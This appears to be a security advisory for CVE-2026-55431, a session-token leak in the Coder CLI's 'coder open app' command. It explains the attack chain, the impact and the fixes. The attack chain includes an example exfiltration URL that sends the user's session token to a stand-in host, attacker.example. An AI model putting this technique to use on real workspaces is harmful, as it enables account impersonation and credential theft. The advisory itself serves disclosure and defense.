---
title: Coder `coder open app` Session Token Leakage Vulnerability (CVE-2026-55431)
slug: 2026-07-coder-session-token-leak
description: A high-severity vulnerability, CVE-2026-55431, in the Coder CLI's `coder open app` command allows malicious workspace template authors to exfiltrate user session tokens via crafted external app URLs, leading to full account impersonation.
date: "2026-07-06T21:10:28Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - credential-access
  - vulnerability
  - cli-exploitation
  - token-leakage
  - coder
vendors:
  - Coder
products:
  - coder/coder/v2 (2.34.0-2.34.1)
  - coder/coder/v2 (2.33.0-2.33.7)
  - coder/coder/v2 (2.30.0-2.32.6)
  - coder/coder/v2 (<2.29.17)
mitre_ttps:
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1539
    technique_name: Steal Web Session Cookie
    evidence: '`coder open app` then sends the user''s session token to the attacker and enables full account impersonation for the token''s lifetime.'
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-v54h-cp2w-9x4g
iocs:
  - type: domain
    value: attacker.example
ioc_counts:
  domain: 1
---

A high-severity vulnerability (CVE-2026-55431) has been identified in the `coder` CLI, specifically impacting the `coder open app` command. This flaw allows an attacker who controls the contents of a Coder workspace to define malicious external application URLs that embed a `$SESSION_TOKEN` placeholder. When a user executes `coder open app` against such a compromised workspace, the CLI erroneously replaces the placeholder with the user's active session token without validating the URL's scheme or host. This crafted URL, now containing the sensitive session token, is then opened by the operating system's default handler (typically a web browser), inadvertently sending the token to an attacker-controlled domain. This vulnerability facilitates full account impersonation for the duration of the session token's validity and can also be used to invoke arbitrary local URI scheme handlers. The issue affects Coder versions prior to 2.34.2, 2.33.8, 2.32.7, and 2.29.17.

## Attack Chain

1.  **Initial Compromise**: An attacker gains control over the definition of an external application within a Coder workspace, typically by authoring or modifying a malicious workspace template.
2.  **Malicious Configuration**: The attacker configures the external application's URL to include the `$SESSION_TOKEN` placeholder and points it to an attacker-controlled domain (e.g., `https://attacker.example/?t=$SESSION_TOKEN`).
3.  **User Interaction**: A legitimate Coder user, interacting with their environment, invokes the `coder open app` command, targeting the compromised or maliciously configured workspace.
4.  **Token Substitution**: The vulnerable `coder` CLI, failing to validate the URL's scheme or host, replaces the `$SESSION_TOKEN` placeholder with the user's active session token.
5.  **External Launch**: The CLI then hands off the maliciously crafted URL, now containing the session token, to the operating system's default handler (e.g., a web browser) for execution.
6.  **Data Exfiltration**: The handling application (e.g., web browser) performs a GET request to the attacker-controlled server (`attacker.example`), inadvertently transmitting the victim's session token as a URL parameter.
7.  **Account Impersonation**: The attacker captures the exfiltrated session token and uses it to gain unauthorized, full access to the victim's Coder account, allowing for complete impersonation and control.

## Impact

This vulnerability poses a significant risk as it enables full account impersonation, granting attackers unauthorized access to a victim's Coder account and potentially any resources accessible through that account. If exploited, an attacker can perform any action the compromised user is authorized to do, including accessing code, deploying resources, or modifying configurations within the Coder environment. The vulnerability also carries the risk of invoking arbitrary local URI scheme handlers, which could lead to further compromise or execution of malicious code on the victim's machine. The primary target is any user who interacts with potentially untrusted Coder workspaces using the `coder open app` command.

## Recommendation

*   **Patch CVE-2026-55431** immediately by upgrading Coder CLI to version `v2.34.2`, `v2.33.8`, `v2.32.7`, `v2.29.17`, or newer, as specified in the patches section.
*   **Implement User Awareness Training**: Educate users to avoid running the `coder open app` command for workspaces with unknown or untrusted origins as per the workaround.
*   **Monitor Network Traffic**: Block outbound connections to the domain `attacker.example` at the network perimeter.
